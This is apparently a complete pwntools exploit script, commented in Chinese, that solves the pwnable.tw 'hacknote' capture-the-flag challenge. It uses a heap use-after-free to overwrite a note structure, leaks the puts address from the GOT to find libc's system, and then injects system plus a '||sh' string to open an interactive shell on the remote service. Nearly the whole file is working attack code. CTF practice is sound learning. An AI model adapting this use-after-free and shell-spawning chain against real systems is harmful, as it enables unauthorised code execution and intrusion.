# -*- coding: utf-8 -*-
from pwn import *
p = remote('chall.pwnable.tw', 10102)
libc = ELF('./libc_32.so.6')
elf = ELF('./hacknote')

def add(length, content):
    p.sendlineafter('Your choice :','1')
    p.sendlineafter('Note size :',length)
    p.sendlineafter('Content :',content)

def delet(index):
    p.sendlineafter('Your choice :','2')
    p.sendlineafter('Index :',index)

def printf(cmd):
    p.sendlineafter('Your choice :','3')
    p.sendlineafter('Index :',cmd)

def exit():
    p.sendlineafter('Your choice :','4')

add('16', 'a' * 8)#申请16字节的空间
add('16', 'b' * 8)
delet('0')
delet('1')#依次free掉，由于fastbin是LIFO先进后出原则，所以chunk_1的struct位置存放chunk_2的struct，chunk_0的struct位置存放chunk_2的content，
add('8', p32(0x0804862b) + p32(elf.got['puts']))#p32(0x0804862b)这个是打印函数函数的实际地址，后面接的是参数puts函数在got表中的真实地址
printf('0')#我们修改了第一个note的结构体，再次调用执行的还是puts函数但是参数改变了
puts_addr = u32(p.recv(4))
lib_addr = puts_addr - libc.symbols['puts']  # 0x67250
system_addr = lib_addr + libc.symbols['system']  # 0x3cd10
print "[*]puts_addr: " + hex(puts_addr)
print "[*]system_addr: " + hex(system_addr)
delet('2')
add('8', p32(system_addr) + "||sh")#同样是传递参数,利用system中的截断||,无法直接传递/bin/sh
printf('0')
p.interactive()
